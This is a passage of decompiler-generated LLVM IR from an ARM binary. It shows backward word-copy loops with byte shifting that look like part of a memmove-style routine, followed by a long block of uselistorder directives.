  %v1_19034 = phi i32 [ %v5_19034, %dec_label_pc_19028 ], [ %v1_19010, %dec_label_pc_1901c ], [ %v0_1901019, %dec_label_pc_18fdc ]
  %v0_19028 = load i32, i32* @r3, align 4
  %v3_19028 = mul i32 %v0_19028, 256
  store i32 %v3_19028, i32* %ip.global-to-local, align 4
  %v0_1902c = load i32, i32* %r1.global-to-local, align 4
  %v1_1902c = add i32 %v0_1902c, -4
  %v2_1902c = inttoptr i32 %v1_1902c to i32*
  %v3_1902c = load i32, i32* %v2_1902c, align 4
  store i32 %v3_1902c, i32* @r3, align 4
  store i32 %v1_1902c, i32* %r1.global-to-local, align 4
  %v4_19030 = udiv i32 %v3_1902c, 16777216
  %v5_19030 = or i32 %v4_19030, %v3_19028
  store i32 %v5_19030, i32* @ip, align 4
  %v2_19034 = add i32 %v1_19034, -4
  %v3_19034 = inttoptr i32 %v2_19034 to i32*
  store i32 %v5_19030, i32* %v3_19034, align 4
  %v4_19034 = load i32, i32* %r0.global-to-local, align 4
  %v5_19034 = add i32 %v4_19034, -4
  store i32 %v5_19034, i32* %r0.global-to-local, align 4
  %v0_19038 = load i32, i32* %r2.global-to-local, align 4
  %v2_19038 = add i32 %v0_19038, -4
  store i32 %v2_19038, i32* %r2.global-to-local, align 4
  %v6_1903c = icmp slt i32 %v0_19038, 4
  br i1 %v6_1903c, label %dec_label_pc_19040.loopexit, label %dec_label_pc_19028

dec_label_pc_19040.loopexit:                      ; preds = %dec_label_pc_19028
  %v4_19038 = sub i32 3, %v0_19038
  %v5_19038 = and i32 %v4_19038, %v0_19038
  %v6_19038 = icmp slt i32 %v5_19038, 0
  %v7_19038 = icmp slt i32 %v2_19038, 0
  store i1 %v6_19038, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19038, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19040

dec_label_pc_19040:                               ; preds = %dec_label_pc_19040.loopexit, %dec_label_pc_1901c
  %v2_18f8451 = phi i32 [ %v5_19034, %dec_label_pc_19040.loopexit ], [ %v1_19010, %dec_label_pc_1901c ]
  %v0_18f7447 = phi i32 [ %v2_19038, %dec_label_pc_19040.loopexit ], [ %v2_19020, %dec_label_pc_1901c ]
  %v0_19040 = load i32, i32* %r1.global-to-local, align 4
  %v1_19040 = add i32 %v0_19040, 3
  store i32 %v1_19040, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_19048:                               ; preds = %dec_label_pc_18fd8
  br i1 %v5_190b8, label %dec_label_pc_19094, label %dec_label_pc_19050

dec_label_pc_19050:                               ; preds = %dec_label_pc_19048
  store i32 %v2_190b4, i32* %r2.global-to-local, align 4
  %v3_19054 = load i32, i32* @r4, align 4
  store i32 %v3_19054, i32* %stack_var_-12, align 4
  %v6_19054 = load i32, i32* @r5, align 4
  %v8_19054 = inttoptr i32 %v6_19054 to i8*
  store i8* %v8_19054, i8** %stack_var_-8, align 4
  %v11_19054 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19058

dec_label_pc_19058:                               ; preds = %dec_label_pc_19058.dec_label_pc_19058_crit_edge, %dec_label_pc_19050
  %v0_1907c = phi i32 [ %v1_1907c, %dec_label_pc_19058.dec_label_pc_19058_crit_edge ], [ %v0_1901019, %dec_label_pc_19050 ]
  %v0_1905c = phi i32 [ %v0_1905c.pre, %dec_label_pc_19058.dec_label_pc_19058_crit_edge ], [ %v1_18fc8, %dec_label_pc_19050 ]
  %v0_19058 = phi i32 [ %v0_19058.pre, %dec_label_pc_19058.dec_label_pc_19058_crit_edge ], [ %v2_18fcc, %dec_label_pc_19050 ]
  %v3_19058 = mul i32 %v0_19058, 65536
  store i32 %v3_19058, i32* %lr.global-to-local, align 4
  %v1_1905c = add i32 %v0_1905c, -4
  %v2_1905c = inttoptr i32 %v1_1905c to i32*
  %v3_1905c = load i32, i32* %v2_1905c, align 4
  store i32 %v3_1905c, i32* @r3, align 4
  %v4_1905c = add i32 %v0_1905c, -8
  %v5_1905c = inttoptr i32 %v4_1905c to i32*
  %v6_1905c = load i32, i32* %v5_1905c, align 4
  store i32 %v6_1905c, i32* %r4.global-to-local, align 4
  %v7_1905c = add i32 %v0_1905c, -12
  %v8_1905c = inttoptr i32 %v7_1905c to i32*
  %v9_1905c = load i32, i32* %v8_1905c, align 4
  store i32 %v9_1905c, i32* %r5.global-to-local, align 4
  %v10_1905c = add i32 %v0_1905c, -16
  %v11_1905c = inttoptr i32 %v10_1905c to i32*
  %v12_1905c = load i32, i32* %v11_1905c, align 4
  store i32 %v10_1905c, i32* %r1.global-to-local, align 4
  %v4_19060 = udiv i32 %v12_1905c, 65536
  %v5_19060 = or i32 %v4_19060, %v3_19058
  store i32 %v5_19060, i32* %lr.global-to-local, align 4
  %v3_19064 = mul i32 %v12_1905c, 65536
  %v4_19068 = udiv i32 %v9_1905c, 65536
  %v5_19068 = or i32 %v3_19064, %v4_19068
  store i32 %v5_19068, i32* @ip, align 4
  %v3_1906c = mul i32 %v9_1905c, 65536
  %v4_19070 = udiv i32 %v6_1905c, 65536
  %v5_19070 = or i32 %v3_1906c, %v4_19070
  store i32 %v5_19070, i32* %r5.global-to-local, align 4
  %v3_19074 = mul i32 %v6_1905c, 65536
  %v4_19078 = udiv i32 %v3_1905c, 65536
  %v5_19078 = or i32 %v3_19074, %v4_19078
  store i32 %v5_19078, i32* %r4.global-to-local, align 4
  %v1_1907c = add i32 %v0_1907c, -16
  %v2_1907c = inttoptr i32 %v1_1907c to i32*
  store i32 %v5_19078, i32* %v2_1907c, align 4
  %v4_1907c = add i32 %v0_1907c, -12
  %v5_1907c = inttoptr i32 %v4_1907c to i32*
  %v6_1907c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1907c, i32* %v5_1907c, align 4
  %v7_1907c = add i32 %v0_1907c, -8
  %v8_1907c = inttoptr i32 %v7_1907c to i32*
  %v9_1907c = load i32, i32* @ip, align 4
  store i32 %v9_1907c, i32* %v8_1907c, align 4
  %v10_1907c = add i32 %v0_1907c, -4
  %v11_1907c = inttoptr i32 %v10_1907c to i32*
  %v12_1907c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1907c, i32* %v11_1907c, align 4
  store i32 %v1_1907c, i32* %r0.global-to-local, align 4
  %v0_19080 = load i32, i32* %r2.global-to-local, align 4
  %v2_19080 = add i32 %v0_19080, -16
  store i32 %v2_19080, i32* %r2.global-to-local, align 4
  %v6_19084 = icmp slt i32 %v0_19080, 16
  br i1 %v6_19084, label %dec_label_pc_19088, label %dec_label_pc_19058.dec_label_pc_19058_crit_edge

dec_label_pc_19058.dec_label_pc_19058_crit_edge:  ; preds = %dec_label_pc_19058
  %v0_19058.pre = load i32, i32* @r3, align 4
  %v0_1905c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19058

dec_label_pc_19088:                               ; preds = %dec_label_pc_19058
  %v2_19088 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19088, i32* @r4, align 4
  %v5_19088 = load i8*, i8** %stack_var_-8, align 4
  %v6_19088 = ptrtoint i8* %v5_19088 to i32
  store i32 %v6_19088, i32* @r5, align 4
  store i32 %v11_19054, i32* @lr, align 4
  %v2_1908c = add i32 %v0_19080, -4
  store i32 %v2_1908c, i32* %r2.global-to-local, align 4
  %v4_1908c = add i32 %v0_19080, 2147483632
  %v5_1908c = and i32 %v2_1908c, %v4_1908c
  %v6_1908c = icmp slt i32 %v5_1908c, 0
  store i1 %v6_1908c, i1* %cpsr_v.global-to-local, align 1
  %v7_1908c = icmp slt i32 %v2_1908c, 0
  store i1 %v7_1908c, i1* %cpsr_n.global-to-local, align 1
  %v8_1908c = icmp eq i32 %v2_1908c, 0
  store i1 %v8_1908c, i1* %cpsr_z.global-to-local, align 1
  %v5_19090 = icmp slt i32 %v2_19080, -12
  br i1 %v5_19090, label %dec_label_pc_190ac, label %dec_label_pc_19094

dec_label_pc_19094:                               ; preds = %dec_label_pc_19088, %dec_label_pc_19048, %dec_label_pc_19094
  %v1_190a0 = phi i32 [ %v5_190a0, %dec_label_pc_19094 ], [ %v1_1907c, %dec_label_pc_19088 ], [ %v0_1901019, %dec_label_pc_19048 ]
  %v0_19094 = load i32, i32* @r3, align 4
  %v3_19094 = mul i32 %v0_19094, 65536
  store i32 %v3_19094, i32* %ip.global-to-local, align 4
  %v0_19098 = load i32, i32* %r1.global-to-local, align 4
  %v1_19098 = add i32 %v0_19098, -4
  %v2_19098 = inttoptr i32 %v1_19098 to i32*
  %v3_19098 = load i32, i32* %v2_19098, align 4
  store i32 %v3_19098, i32* @r3, align 4
  store i32 %v1_19098, i32* %r1.global-to-local, align 4
  %v4_1909c = udiv i32 %v3_19098, 65536
  %v5_1909c = or i32 %v4_1909c, %v3_19094
  store i32 %v5_1909c, i32* @ip, align 4
  %v2_190a0 = add i32 %v1_190a0, -4
  %v3_190a0 = inttoptr i32 %v2_190a0 to i32*
  store i32 %v5_1909c, i32* %v3_190a0, align 4
  %v4_190a0 = load i32, i32* %r0.global-to-local, align 4
  %v5_190a0 = add i32 %v4_190a0, -4
  store i32 %v5_190a0, i32* %r0.global-to-local, align 4
  %v0_190a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_190a4 = add i32 %v0_190a4, -4
  store i32 %v2_190a4, i32* %r2.global-to-local, align 4
  %v6_190a8 = icmp slt i32 %v0_190a4, 4
  br i1 %v6_190a8, label %dec_label_pc_190ac.loopexit, label %dec_label_pc_19094

dec_label_pc_190ac.loopexit:                      ; preds = %dec_label_pc_19094
  %v4_190a4 = sub i32 3, %v0_190a4
  %v5_190a4 = and i32 %v4_190a4, %v0_190a4
  %v6_190a4 = icmp slt i32 %v5_190a4, 0
  %v7_190a4 = icmp slt i32 %v2_190a4, 0
  store i1 %v6_190a4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_190a4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_190ac

dec_label_pc_190ac:                               ; preds = %dec_label_pc_190ac.loopexit, %dec_label_pc_19088
  %v2_18f8452 = phi i32 [ %v5_190a0, %dec_label_pc_190ac.loopexit ], [ %v1_1907c, %dec_label_pc_19088 ]
  %v0_18f7448 = phi i32 [ %v2_190a4, %dec_label_pc_190ac.loopexit ], [ %v2_1908c, %dec_label_pc_19088 ]
  %v0_190ac = load i32, i32* %r1.global-to-local, align 4
  %v1_190ac = add i32 %v0_190ac, 2
  store i32 %v1_190ac, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_190b4:                               ; preds = %dec_label_pc_18fc8
  br i1 %v5_190b8, label %dec_label_pc_19100, label %dec_label_pc_190bc

dec_label_pc_190bc:                               ; preds = %dec_label_pc_190b4
  store i32 %v2_190b4, i32* %r2.global-to-local, align 4
  %v3_190c0 = load i32, i32* @r4, align 4
  store i32 %v3_190c0, i32* %stack_var_-12, align 4
  %v6_190c0 = load i32, i32* @r5, align 4
  %v8_190c0 = inttoptr i32 %v6_190c0 to i8*
  store i8* %v8_190c0, i8** %stack_var_-8, align 4
  %v11_190c0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_190c4

dec_label_pc_190c4:                               ; preds = %dec_label_pc_190c4.dec_label_pc_190c4_crit_edge, %dec_label_pc_190bc
  %v0_190e8 = phi i32 [ %v1_190e8, %dec_label_pc_190c4.dec_label_pc_190c4_crit_edge ], [ %v0_1901019, %dec_label_pc_190bc ]
  %v0_190c8 = phi i32 [ %v0_190c8.pre, %dec_label_pc_190c4.dec_label_pc_190c4_crit_edge ], [ %v1_18fc8, %dec_label_pc_190bc ]
  %v0_190c4 = phi i32 [ %v0_190c4.pre, %dec_label_pc_190c4.dec_label_pc_190c4_crit_edge ], [ %v2_18fcc, %dec_label_pc_190bc ]
  %v3_190c4 = mul i32 %v0_190c4, 16777216
  store i32 %v3_190c4, i32* %lr.global-to-local, align 4
  %v1_190c8 = add i32 %v0_190c8, -4
  %v2_190c8 = inttoptr i32 %v1_190c8 to i32*
  %v3_190c8 = load i32, i32* %v2_190c8, align 4
  store i32 %v3_190c8, i32* @r3, align 4
  %v4_190c8 = add i32 %v0_190c8, -8
  %v5_190c8 = inttoptr i32 %v4_190c8 to i32*
  %v6_190c8 = load i32, i32* %v5_190c8, align 4
  store i32 %v6_190c8, i32* %r4.global-to-local, align 4
  %v7_190c8 = add i32 %v0_190c8, -12
  %v8_190c8 = inttoptr i32 %v7_190c8 to i32*
  %v9_190c8 = load i32, i32* %v8_190c8, align 4
  store i32 %v9_190c8, i32* %r5.global-to-local, align 4
  %v10_190c8 = add i32 %v0_190c8, -16
  %v11_190c8 = inttoptr i32 %v10_190c8 to i32*
  %v12_190c8 = load i32, i32* %v11_190c8, align 4
  store i32 %v10_190c8, i32* %r1.global-to-local, align 4
  %v4_190cc = udiv i32 %v12_190c8, 256
  %v5_190cc = or i32 %v4_190cc, %v3_190c4
  store i32 %v5_190cc, i32* %lr.global-to-local, align 4
  %v3_190d0 = mul i32 %v12_190c8, 16777216
  %v4_190d4 = udiv i32 %v9_190c8, 256
  %v5_190d4 = or i32 %v3_190d0, %v4_190d4
  store i32 %v5_190d4, i32* @ip, align 4
  %v3_190d8 = mul i32 %v9_190c8, 16777216
  %v4_190dc = udiv i32 %v6_190c8, 256
  %v5_190dc = or i32 %v3_190d8, %v4_190dc
  store i32 %v5_190dc, i32* %r5.global-to-local, align 4
  %v3_190e0 = mul i32 %v6_190c8, 16777216
  %v4_190e4 = udiv i32 %v3_190c8, 256
  %v5_190e4 = or i32 %v3_190e0, %v4_190e4
  store i32 %v5_190e4, i32* %r4.global-to-local, align 4
  %v1_190e8 = add i32 %v0_190e8, -16
  %v2_190e8 = inttoptr i32 %v1_190e8 to i32*
  store i32 %v5_190e4, i32* %v2_190e8, align 4
  %v4_190e8 = add i32 %v0_190e8, -12
  %v5_190e8 = inttoptr i32 %v4_190e8 to i32*
  %v6_190e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_190e8, i32* %v5_190e8, align 4
  %v7_190e8 = add i32 %v0_190e8, -8
  %v8_190e8 = inttoptr i32 %v7_190e8 to i32*
  %v9_190e8 = load i32, i32* @ip, align 4
  store i32 %v9_190e8, i32* %v8_190e8, align 4
  %v10_190e8 = add i32 %v0_190e8, -4
  %v11_190e8 = inttoptr i32 %v10_190e8 to i32*
  %v12_190e8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_190e8, i32* %v11_190e8, align 4
  store i32 %v1_190e8, i32* %r0.global-to-local, align 4
  %v0_190ec = load i32, i32* %r2.global-to-local, align 4
  %v2_190ec = add i32 %v0_190ec, -16
  store i32 %v2_190ec, i32* %r2.global-to-local, align 4
  %v6_190f0 = icmp slt i32 %v0_190ec, 16
  br i1 %v6_190f0, label %dec_label_pc_190f4, label %dec_label_pc_190c4.dec_label_pc_190c4_crit_edge

dec_label_pc_190c4.dec_label_pc_190c4_crit_edge:  ; preds = %dec_label_pc_190c4
  %v0_190c4.pre = load i32, i32* @r3, align 4
  %v0_190c8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_190c4

dec_label_pc_190f4:                               ; preds = %dec_label_pc_190c4
  %v2_190f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_190f4, i32* @r4, align 4
  %v5_190f4 = load i8*, i8** %stack_var_-8, align 4
  %v6_190f4 = ptrtoint i8* %v5_190f4 to i32
  store i32 %v6_190f4, i32* @r5, align 4
  store i32 %v11_190c0, i32* @lr, align 4
  %v2_190f8 = add i32 %v0_190ec, -4
  store i32 %v2_190f8, i32* %r2.global-to-local, align 4
  %v4_190f8 = add i32 %v0_190ec, 2147483632
  %v5_190f8 = and i32 %v2_190f8, %v4_190f8
  %v6_190f8 = icmp slt i32 %v5_190f8, 0
  store i1 %v6_190f8, i1* %cpsr_v.global-to-local, align 1
  %v7_190f8 = icmp slt i32 %v2_190f8, 0
  store i1 %v7_190f8, i1* %cpsr_n.global-to-local, align 1
  %v8_190f8 = icmp eq i32 %v2_190f8, 0
  store i1 %v8_190f8, i1* %cpsr_z.global-to-local, align 1
  %v5_190fc = icmp slt i32 %v2_190ec, -12
  br i1 %v5_190fc, label %dec_label_pc_19118, label %dec_label_pc_19100

dec_label_pc_19100:                               ; preds = %dec_label_pc_190f4, %dec_label_pc_190b4, %dec_label_pc_19100
  %v1_1910c = phi i32 [ %v5_1910c, %dec_label_pc_19100 ], [ %v1_190e8, %dec_label_pc_190f4 ], [ %v0_1901019, %dec_label_pc_190b4 ]
  %v0_19100 = load i32, i32* @r3, align 4
  %v3_19100 = mul i32 %v0_19100, 16777216
  store i32 %v3_19100, i32* %ip.global-to-local, align 4
  %v0_19104 = load i32, i32* %r1.global-to-local, align 4
  %v1_19104 = add i32 %v0_19104, -4
  %v2_19104 = inttoptr i32 %v1_19104 to i32*
  %v3_19104 = load i32, i32* %v2_19104, align 4
  store i32 %v3_19104, i32* @r3, align 4
  store i32 %v1_19104, i32* %r1.global-to-local, align 4
  %v4_19108 = udiv i32 %v3_19104, 256
  %v5_19108 = or i32 %v4_19108, %v3_19100
  store i32 %v5_19108, i32* @ip, align 4
  %v2_1910c = add i32 %v1_1910c, -4
  %v3_1910c = inttoptr i32 %v2_1910c to i32*
  store i32 %v5_19108, i32* %v3_1910c, align 4
  %v4_1910c = load i32, i32* %r0.global-to-local, align 4
  %v5_1910c = add i32 %v4_1910c, -4
  store i32 %v5_1910c, i32* %r0.global-to-local, align 4
  %v0_19110 = load i32, i32* %r2.global-to-local, align 4
  %v2_19110 = add i32 %v0_19110, -4
  store i32 %v2_19110, i32* %r2.global-to-local, align 4
  %v6_19114 = icmp slt i32 %v0_19110, 4
  br i1 %v6_19114, label %dec_label_pc_19118.loopexit, label %dec_label_pc_19100

dec_label_pc_19118.loopexit:                      ; preds = %dec_label_pc_19100
  %v4_19110 = sub i32 3, %v0_19110
  %v5_19110 = and i32 %v4_19110, %v0_19110
  %v6_19110 = icmp slt i32 %v5_19110, 0
  %v7_19110 = icmp slt i32 %v2_19110, 0
  store i1 %v6_19110, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19110, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19118

dec_label_pc_19118:                               ; preds = %dec_label_pc_19118.loopexit, %dec_label_pc_190f4
  %v2_18f8453 = phi i32 [ %v5_1910c, %dec_label_pc_19118.loopexit ], [ %v1_190e8, %dec_label_pc_190f4 ]
  %v0_18f7449 = phi i32 [ %v2_19110, %dec_label_pc_19118.loopexit ], [ %v2_190f8, %dec_label_pc_190f4 ]
  %v0_19118 = load i32, i32* %r1.global-to-local, align 4
  %v1_19118 = add i32 %v0_19118, 1
  store i32 %v1_19118, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1910c, { 0, 2, 1 }
  uselistorder i32 %v3_19100, { 1, 0 }
  uselistorder i32 %v2_190f8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_190e8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_190c8, { 1, 0 }
  uselistorder i32 %v3_190c4, { 1, 0 }
  uselistorder i32 %v0_190c8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_190e8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_190a0, { 0, 2, 1 }
  uselistorder i32 %v3_19094, { 1, 0 }
  uselistorder i32 %v2_1908c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1907c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1905c, { 1, 0 }
  uselistorder i32 %v3_19058, { 1, 0 }
  uselistorder i32 %v0_1905c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1907c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19034, { 0, 2, 1 }
  uselistorder i32 %v3_19028, { 1, 0 }
  uselistorder i32 %v2_19020, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19010, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18ff0, { 1, 0 }
  uselistorder i32 %v3_18fec, { 1, 0 }
  uselistorder i32 %v0_18ff0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_19010, { 3, 2, 1, 0 }
  uselistorder i1 %v5_190b8, { 2, 0, 1 }
  uselistorder i32 %v0_18fd0, { 1, 0 }
  uselistorder i32 %v0_190bc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1901019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18fc0, { 2, 1, 0 }
  uselistorder i32 %v0_18fc0, { 2, 0, 1 }
  uselistorder i32 %v2_18fb8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18fb8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18fb8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1901020, { 2, 1, 0 }
  uselistorder i32 %v11_18f94, { 1, 0 }
  uselistorder i32 %v7_18f94, { 1, 0 }
  uselistorder i32 %v1_18f74, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_18f74, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18f78, { 1, 0 }
  uselistorder i32 %v7_18f6c, { 0, 2, 1 }
  uselistorder i32 %v10_18f68, { 1, 0 }
  uselistorder i32 %v9_18f60, { 1, 0, 2 }
  uselistorder i32 %v6_18f5c, { 1, 0 }
  uselistorder i32 %v2_18f54, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_18f54, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_18f64, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18f48, { 0, 2, 1 }
  uselistorder i32 %v13_18f44, { 1, 0 }
  uselistorder i32 %v4_18f40, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_18f40, { 2, 0, 1 }
  uselistorder i32 %v6_18f48, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18f38, { 0, 2, 1 }
  uselistorder i32 %v16_18f34, { 1, 0 }
  uselistorder i32 %v4_18f30, { 1, 2, 0 }
  uselistorder i32 %v0_18f40.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_18f38, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18f24, { 0, 3, 2, 1 }
  uselistorder i32 %v10_18f20, { 1, 0 }
  uselistorder i32 %v1_18f1c, { 1, 0 }
  uselistorder i32 %v10_18f18, { 1, 0 }
  uselistorder i32 %v0_18f18, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18f1c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_18f10, { 0, 2, 1 }
  uselistorder i32 %v2_18f04, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18f04, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_18f1c37, { 1, 2, 0 }
  uselistorder i32 %v1_18efc, { 2, 1, 0 }
  uselistorder i32 %v1_18ef4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_18eec, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_18ee8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_18ee4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_18ee4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_18ed4, { 0, 2, 1 }
  uselistorder i32 %v4_18ed0, { 1, 0 }
  uselistorder i32 %v3_18ec4, { 1, 0 }
  uselistorder i32 %v1_18ebc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18eb0, { 1, 0 }
  uselistorder i32 %v12_18eac, { 0, 2, 1 }
  uselistorder i32 %v8_18e8c, { 1, 0, 2 }
  uselistorder i32 %v5_18e8c, { 1, 0, 2 }
  uselistorder i32 %v2_18e8c, { 1, 0, 2 }
  uselistorder i32 %v0_18e8c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18eac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_18e68, { 0, 2, 1 }
  uselistorder i32 %v4_18e64, { 1, 0 }
  uselistorder i32 %v3_18e58, { 1, 0 }
  uselistorder i32 %v1_18e50, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18e44, { 1, 0 }
  uselistorder i32 %v12_18e40, { 0, 2, 1 }
  uselistorder i32 %v8_18e20, { 1, 0, 2 }
  uselistorder i32 %v5_18e20, { 1, 0, 2 }
  uselistorder i32 %v2_18e20, { 1, 0, 2 }
  uselistorder i32 %v0_18e20, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18e40, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_18dfc, { 0, 2, 1 }
  uselistorder i32 %v4_18df8, { 1, 0 }
  uselistorder i32 %v3_18dec, { 1, 0 }
  uselistorder i32 %v1_18de4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18dd8, { 1, 0 }
  uselistorder i32 %v12_18dd4, { 0, 2, 1 }
  uselistorder i32 %v8_18db4, { 1, 0, 2 }
  uselistorder i32 %v5_18db4, { 1, 0, 2 }
  uselistorder i32 %v2_18db4, { 1, 0, 2 }
  uselistorder i32 %v0_18db4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18dd4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_18e10, { 0, 2, 1 }
  uselistorder i32 %v1_18e0c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_18d90, { 2, 0, 1, 3 }
  uselistorder i32 %v2_18d90, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18e14, { 1, 0, 3, 2 }
  uselistorder i32 %v0_18eac76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_18d84, { 1, 0 }
  uselistorder i32 %v0_18d84, { 3, 1, 0, 2 }
  uselistorder i32 %v2_18d7c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_18d7c, { 1, 0, 2 }
  uselistorder i32 %v0_18d7c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18eac77, { 1, 0 }
  uselistorder i32 %v1_18d5c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_18d64, { 1, 0 }
  uselistorder i32 %v0_18d38, { 3, 0, 1, 2 }
  uselistorder i32 %v1_18d2c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_18d18, { 1, 0, 2 }
  uselistorder i32 %v1_18d14, { 1, 0 }
  uselistorder i32 %v1_18d0c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_18d0c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18d04, { 0, 2, 1 }
  uselistorder i32 %v3_18d04, { 3, 0, 1, 2 }
  uselistorder i1 %v0_18d04, { 1, 0 }
  uselistorder i1 %v1_18d04, { 1, 0 }
  uselistorder i32 %v3_18d00, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18cf8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18ce4, { 1, 2, 0 }
  uselistorder i32 %v1_18cdc, { 0, 2, 1 }
  uselistorder i32 %v12_18cd8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_18ccc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18cd0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_18cc0, { 0, 2, 1 }
  uselistorder i32 %v1_18cb8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18cb8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_18cb0, { 1, 0 }
  uselistorder i32 %v1_18ca8, { 2, 1, 0 }
  uselistorder i32 %v2_18ca0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_18ca0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_18c9c, { 1, 0 }
  uselistorder i32 %v2_18c90, { 1, 0 }
  uselistorder i32 %v1_18c90, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_18c90, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
